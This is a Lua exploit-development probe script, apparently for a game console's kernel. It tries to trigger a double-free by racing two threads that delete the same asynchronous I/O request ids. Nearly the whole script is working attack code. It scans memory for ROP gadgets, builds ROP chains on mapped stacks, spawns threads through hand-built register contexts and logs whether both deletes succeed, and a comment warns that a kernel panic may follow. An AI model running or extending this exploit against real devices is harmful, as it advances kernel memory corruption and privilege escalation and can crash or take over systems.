-- CRASH_CLASS: HIGH
-- PROBE 895a: two child threads delete the same terminal aio ids at once
--
-- 894a showed the sequential shape is refused: one delete owns each slot (0)
-- and the second gets 0x80020003 (ESRCH). zecoxao's win condition is both
-- deletes reporting 0 for one slot, which needs simultaneity. This runs two
-- thr_create children, each issuing one 662(ids,4,errs) from a straight-line
-- chain, and compares their errs arrays. A kernel panic is possible if the
-- double-free lands.
print("=== PROBE 895a: AIO DELETE RACE (2 THREADS) ===")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end
local fn=to_num(syscall.pipe.fn_addr)
print("[0] pid=" .. tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20))))
local info=memory.alloc(0x200); wd(info,0x160)
pcall(function() mk(593)(uint64(0),uint64(info)) end)
local ebase=(rd(info+0x10C) or 0)*4294967296+(rd(info+0x108) or 0)
local function find_pat(base,limit,pat)
    local off=0
    while off<limit do local want=limit-off; if want>0x1000 then want=0x1000 end
        local ok,s=pcall(function() return memory.read_buffer(base+off,want) end)
        if not ok or type(s)~="string" then return nil end
        local i=string.find(s,pat,1,true); if i then return base+off+i-1 end
        off=off+want end
end
local pop_rdi=find_pat(ebase,0x494000,string.char(0x5F,0xC3))
local pop_rsi=find_pat(ebase,0x494000,string.char(0x5E,0xC3))
local pop_rdx=find_pat(ebase,0x494000,string.char(0x5A,0xC3))
local pop_rax=find_pat(ebase,0x494000,string.char(0x58,0xC3))
local store  =find_pat(ebase,0x494000,string.char(0x48,0x89,0x07,0xC3))
local jmp_g  =find_pat(ebase,0x494000,string.char(0xEB,0xFE))
print(string.format("[0] gadgets rax=%s rdi=%s rsi=%s rdx=%s store=%s",
    tostring(pop_rax),tostring(pop_rdi),tostring(pop_rsi),tostring(pop_rdx),tostring(store)))
if not (pop_rax and pop_rdi and pop_rsi and pop_rdx and store and jmp_g) then print("missing gadget") return end

local page=0x4000; local STACK=page*4
local function mmap(px) local _,a=pcall(function() return mk(477)(uint64(0),uint64(px),uint64(3),uint64(0x1002),uint64(0xFFFFFFFF),uint64(0)) end); local v=to_num(a); if v~=0 then zero(v,px) end; return v end
local Ctx={MAGIC=0x108,TYPE=0x110,CS=0x0C0,RIP=0x0E0,RSP=0x0F8,SS=0x100,RDI=0x048,RSI=0x050,RDX=0x058,RCX=0x060,RAX=0x078}
local function child_call(sys,a1,a2,a3,out)
    local block=mmap(STACK); local start=block+STACK-0x200
    local ch={pop_rdi,a1,pop_rsi,a2,pop_rdx,a3,pop_rax,sys,fn,pop_rdi,out,store,jmp_g}
    for i=1,#ch do wq(start+(i-1)*8,uint64(ch[i])) end
    local ctx=memory.alloc(0x500); zero(ctx,0x500)
    wq(ctx+Ctx.MAGIC,uint64(0x480)); wq(ctx+Ctx.TYPE,uint64(0x10000))
    wq(ctx+Ctx.CS,uint64(0x43)); wq(ctx+Ctx.SS,uint64(0x3B))
    wq(ctx+Ctx.RIP,uint64(fn)); wq(ctx+Ctx.RSP,uint64(start))
    wq(ctx+Ctx.RDI,uint64(a1)); wq(ctx+Ctx.RSI,uint64(a2)); wq(ctx+Ctx.RDX,uint64(a3))
    wq(ctx+Ctx.RAX,uint64(sys))
    local tb=memory.alloc(8); wq(tb,uint64(0))
    local ok,rv=pcall(function() return mk(430)(uint64(ctx),uint64(tb),uint64(0)) end)
    return ok and to_num(rv) or -999
end
local ts=memory.alloc(16)
local function sleep_ms(ms) wq(ts,0); wq(ts+8,ms*1000000); pcall(function() mk(240)(uint64(ts),uint64(0)) end) end

local N=4
local sv=memory.alloc(8); local reqs=memory.alloc(0x28*N); local ids=memory.alloc(8*N)
local st=memory.alloc(8*N); local eA=memory.alloc(8*N); local eB=memory.alloc(8*N); local buf=memory.alloc(0x1000)
zero(sv,8); zero(reqs,0x28*N); zero(ids,8*N)
pcall(function() mk(135)(uint64(1),uint64(1),uint64(0),uint64(sv)) end)
local fd0=rd(sv)
print(string.format("[1] socketpair fds=%d,%d",fd0,rd(sv+4) or 0))
if not fd0 or fd0<=0 then print("no socketpair") return end
local b=to_num(buf); local blo=b%4294967296; local bhi=math.floor(b/4294967296)
for i=0,N-1 do local r=reqs+i*0x28
    wd(r+0x08,0x1000); wd(r+0x10,blo); wd(r+0x14,bhi); wd(r+0x20,fd0) end

local oA=memory.alloc(8); local oB=memory.alloc(8)
local wins=0
for round=1,12 do
    zero(ids,8*N); zero(eA,8*N); zero(eB,8*N); zero(oA,8); zero(oB,8)
    local ok,rvs=pcall(function() return mk(669)(uint64(0x1001),uint64(reqs),uint64(N),uint64(3),uint64(ids)) end)
    if not ok then print("[R"..round.."] submit PCALL-FAIL") break end
    pcall(function() mk(666)(uint64(ids),uint64(N),uint64(st)) end)
    pcall(function() mk(664)(uint64(ids),uint64(N),uint64(st)) end)
    local s0,s1,s2,s3=rd(st),rd(st+4),rd(st+8),rd(st+12)
    -- separate store buffer per child so errs[0] is not overwritten by rax
    local t1=child_call(662,ids,N,eA,oA)
    local t2=child_call(662,ids,N,eB,oB)
    sleep_ms(6)
    local msg=""
    for i=0,N-1 do
        local a,bv=rd(eA+i*4),rd(eB+i*4)
        if a==0 and bv==0 then wins=wins+1 msg=msg..string.format(" slot%d BOTH-ZERO",i) end
    end
    print(string.format("[R%d] st=%s,%s,%s,%s rv=%X/%X eA=%X,%X,%X,%X eB=%X,%X,%X,%X%s",
        round,tostring(s0),tostring(s1),tostring(s2),tostring(s3),rd(oA) or 0,rd(oB) or 0,
        rd(eA) or 0,rd(eA+4) or 0,rd(eA+8) or 0,rd(eA+12) or 0,
        rd(eB) or 0,rd(eB+4) or 0,rd(eB+8) or 0,rd(eB+12) or 0,msg))
end
print(string.format("[Z] alive pid=%s  double-free slots seen=%d",
    tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20))),wins))
print("=== PROBE 895a DONE ===")
